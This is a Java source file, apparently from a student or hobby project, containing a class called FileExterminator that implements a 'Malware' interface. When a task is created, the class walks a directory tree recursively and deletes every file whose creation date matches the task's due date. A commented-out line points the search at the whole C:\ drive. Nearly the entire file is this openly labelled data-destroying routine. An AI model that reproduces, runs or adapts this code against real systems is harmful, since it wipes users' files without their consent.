import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;

/**
 * 
 * @author aalea
 * 
 * This class is sent a date. This would occur when 
 * a task is created. The class searches the system 
 * for files created on the same date as the new task. 
 * Upon finding these files, the class deletes them. 
 *
 */
public class FileExterminator implements Malware {
	
	/**
	 * due date of the task
	 */
	private Date date;
	
	/**
	 * files to delete
	 */
	private ArrayList<File> victimFiles;
	
	/**
	 * the constructor method
	 * 
	 * @param task that the due date will be extracted out of
	 */
	public FileExterminator(Task task) {
		//initializes arraylist of files to delete
		this.victimFiles = new ArrayList<File>();
		//1. Save the due date of the task
		this.date = task.getDate();
		
		//2. Call the method that searches the system
		searchSystem(new File("C:\\Users\\aalea\\ComputerFileSystem"));
		//searchSystem(new File("C:\\"));
		//3. Call the method that deletes the files
		attack();
		
	}

	/**
	 * 
	 * this method searches the computer for a file.
	 * Code based on <a href>https://stackoverflow.com/questions/15624226/java-search-for-files-in-a-directory</a>
	 * 
	 * @param the file to be searched for
	 * 
	 */
	public void searchSystem(File file) {
		
		//2. If the list of files in the directory is not empty
		if (file.list().length > 0) {
			//goes through the directory
			for (int i = 0; i < file.list().length; i++) {
			//2.1. Check if the item in list is another directory
				if (new File(file.getPath() + "\\" + file.list()[i]).isDirectory()) {
				//2.1.1. If so, run this method again, with parameter file the current item in the list
					System.out.println("* recursion *");
					searchSystem(new File(file.getPath() + "\\" + file.list()[i]));
				}

			//2.2. If not, attempt to read the file attributes
				else {
					//create file variable out of element in file list, as file.list() only returns a string array
					File potentialVictim = new File(file.getPath() + "\\" + file.list()[i]);
				//2.2.1. If possible to read, grab the creation date
					BasicFileAttributes attr = null; //initializes attribute 
					Date creationDate = new Date(0); //initializes creation date of file
					try {
						//get attributes
						attr = Files.readAttributes(potentialVictim.toPath(), BasicFileAttributes.class);
	
					} catch (IOException e) {
						// TODO Auto-generated catch block
						System.out.println(e);
					}
					finally {
	
						creationDate = new Date(attr.creationTime().toMillis()); //grab creation date of file
					}
					
				//2.2.2. If the creation date is the same as the due date of the task
					if (creationDate.getMonth()==date.getMonth() && creationDate.getDate()==date.getDate()) {
						System.out.println(potentialVictim);
						//2.2.2.1. Add the task to an arraylist of files to delete
						victimFiles.add(potentialVictim);
					}
					
				}
			}
		//3. Continue reading next file until list of files are all read
		}
	}

	/**
	 * this method iterates through all the files that were collected and deletes them
	 */
	@Override
	public void attack() {
		//iterate through all the files that were collected
		for (int i = 0; i < victimFiles.size(); i++) {
			System.out.println("ABOUT TO DELETE");
			victimFiles.get(i).delete(); //delete the file if possible
			System.out.println("DELETED");
		}
		
	}

}
